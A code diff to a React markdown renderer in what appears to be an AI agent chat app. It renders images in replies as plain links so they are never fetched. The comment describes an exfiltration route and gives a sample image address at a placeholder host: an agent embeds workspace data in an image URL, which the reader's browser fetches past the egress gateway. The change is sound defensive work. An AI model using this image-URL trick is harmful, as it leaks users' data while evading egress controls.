@@ -7,6 +7,31 @@ import remarkGfm from 'remark-gfm'
 import { newFadeState, rehypeStreamFade } from '../lib/streamFade'
 
 /**
+ * An image in markdown somebody else wrote, shown as its address and never
+ * fetched.
+ *
+ * A browser fetches an image the moment it is rendered, with no click, so an
+ * agent that writes `![](https://somewhere/?d=...)` has the reader's browser
+ * send whatever it put in the address -- including what it read from the
+ * workspace -- to a host no egress rule ever saw. Every other way an agent
+ * reaches the outside goes through the gateway; this one would not. A link
+ * is fine: following it is the reader's choice, and they can see where to.
+ */
+export function UnfetchedImage({ src, alt }: { src?: string; alt?: string }) {
+  return (
+    <a
+      href={src}
+      target="_blank"
+      rel="noreferrer"
+      className="underline underline-offset-2 hover:no-underline"
+      title="Images in replies are not loaded"
+    >
+      [image{alt ? `: ${alt}` : ''}] {src}
+    </a>
+  )
+}
+
+/**
  * Renders message text as markdown, for both sides of the conversation.
  *
  * Components are memoized because this re-renders on every delta while a reply
@@ -87,6 +112,7 @@ const components = unstable_memoizeMarkdownComponents({
     )
   },
   hr: () => <hr className="my-4 border-surface-200 dark:border-surface-800 group-[.user]:border-white/30" />,
+  img: ({ src, alt }) => <UnfetchedImage src={typeof src === 'string' ? src : undefined} alt={alt} />,
 })
 
 export default function MarkdownText() {
